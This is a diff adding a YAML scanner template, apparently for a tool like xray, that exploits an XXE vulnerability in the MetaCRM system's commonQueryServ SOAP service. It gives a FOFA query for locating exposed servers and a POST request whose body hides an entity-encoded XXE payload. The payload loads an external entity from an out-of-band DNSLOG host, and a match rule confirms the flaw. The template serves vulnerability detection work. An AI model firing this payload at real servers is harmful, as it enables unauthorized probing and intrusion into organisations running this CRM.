@@ -1,0 +1,28 @@
+id: poc-yaml-meta-crm-commonqueryserv-xxe
+info:
+  name: MetaCRM客户关系管理系统 commonQueryServ XXE漏洞
+  severity: high
+  tags:
+  - DNSLOG
+  - xxe
+  finger: MetaCRM客户关系管理系统
+  fofa: body="/common/scripts/basic.js" && body="www.metacrm.com.cn"
+variables:
+  reverse: new_dns_log()
+  domain: reverse.Domain()
+requests:
+- method: POST
+  path: /services/ws
+  headers:
+    SOAPAction: null
+    Content-Type: text/xml;charset=UTF-8
+  data: "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"\
+    \ xmlns:data=\"http://data.service.ws.metasoft.com/\">\n   <soapenv:Header/>\n\
+    \   <soapenv:Body>\n      <data:commonQueryServ>\n         <!--type: string-->\n\
+    \         <accessSessionValue>&#x3c;&#x3f;&#x78;&#x6d;&#x6c;&#x20;&#x76;&#x65;&#x72;&#x73;&#x69;&#x6f;&#x6e;&#x3d;&#x22;&#x31;&#x2e;&#x30;&#x22;&#x20;&#x65;&#x6e;&#x63;&#x6f;&#x64;&#x69;&#x6e;&#x67;&#x3d;&#x22;&#x55;&#x54;&#x46;&#x2d;&#x38;&#x22;&#x3f;&#x3e;&#x0a;&#x3c;&#x21;&#x44;&#x4f;&#x43;&#x54;&#x59;&#x50;&#x45;&#x20;&#x72;&#x6f;&#x6f;&#x74;&#x20;&#x5b;&#x0a;&#x3c;&#x21;&#x45;&#x4e;&#x54;&#x49;&#x54;&#x59;&#x20;&#x25;&#x20;&#x72;&#x65;&#x6d;&#x6f;&#x74;&#x65;&#x20;&#x53;&#x59;&#x53;&#x54;&#x45;&#x4d;&#x20;&#x22;https://{{.domain}}&#x2f;&#x78;&#x78;&#x65;&#x5f;&#x74;&#x65;&#x73;&#x74;&#x22;&#x3e;&#x0a;&#x25;&#x72;&#x65;&#x6d;&#x6f;&#x74;&#x65;&#x3b;&#x5d;&#x3e;&#x0a;&#x3c;&#x72;&#x6f;&#x6f;&#x74;&#x2f;&#x3e;</accessSessionValue>\n\
+    \         <!--type: string-->\n         <objectname>sonoras</objectname>\n   \
+    \      <!--type: string-->\n         <corditionxml>quae</corditionxml>\n     \
+    \ </data:commonQueryServ>\n   </soapenv:Body>\n</soapenv:Envelope>"
+  expression: status_code == 500 && contains(body,"XML document must not be null")
+    && contains(content_type,"text/xml") && reverse.Verify()
+transport: http
